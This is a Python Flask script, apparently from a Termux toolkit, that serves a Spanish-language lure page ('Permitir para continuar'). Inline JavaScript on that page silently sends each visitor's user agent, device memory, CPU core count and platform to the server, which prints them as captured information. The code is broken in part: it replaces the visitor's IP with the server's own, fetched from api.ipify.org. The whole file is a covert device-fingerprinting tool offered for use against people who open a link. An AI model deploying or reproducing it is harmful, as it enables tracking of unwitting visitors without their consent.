from flask import Flask, request, jsonify
import sys
import os

sys.path.append('../../modulo')
from modulo import zph_style
from config import basic, puertos
import requests

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        data = request.json
        user_agent = request.headers.get('User-Agent')
        device_info = data.get('device_info', {})
        public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        response = requests.get('https://api.ipify.org')
        public_ip = response.text

        # Imprimir la información en Termux
        print()
        zph_style.to_style("EL USER-AGENT: ")
        print(user_agent)
        print()
        zph_style.to_style("LA IP: ")
        print(public_ip)
        print()
        zph_style.to_style("INFO DEL DISPOSITIVO: ")
        print(f"{device_info}")

        return "Información capturada y almacenada en el servidor."
    else:
        static_files = os.listdir('static')
        background_image = f"/static/{static_files[0]}"
        return f'''
<!doctype html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{{
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-image: url('{background_image}');
        }}
        h1{{
            text-align: center; /* Alinea el texto al centro */
            font-family: Arial, sans-serif; /* Establece la fuente del texto */
            font-size: 24px; /* Tamaño de fuente */
            color: #333; /* Color del texto */
            margin-top: 50px; /* Espacio superior */
        }}
    </style>
</head>
<body>
<script>
    function getDeviceInfo() {{
        var memory = navigator.deviceMemory || 'N/A';
        var cores = navigator.hardwareConcurrency || 'N/A';
        var platform = navigator.platform || 'N/A';

        var device_info = {{
            memory: memory,
            cores: cores,
            platform: platform
        }};

        fetch('/', {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json'
            }},
            body: JSON.stringify({{
                user_agent: navigator.userAgent,
                device_info: device_info
            }})
        }})
        .then(response => response.text())
        .then(data => {{
            console.log(data);
        }});
    }}

    getDeviceInfo();
</script>
    <h1> Permitir para continuar </h1>
</body>
</html>
'''

if __name__ == '__main__':
    basic()
    app.run(debug=True, port=puertos())
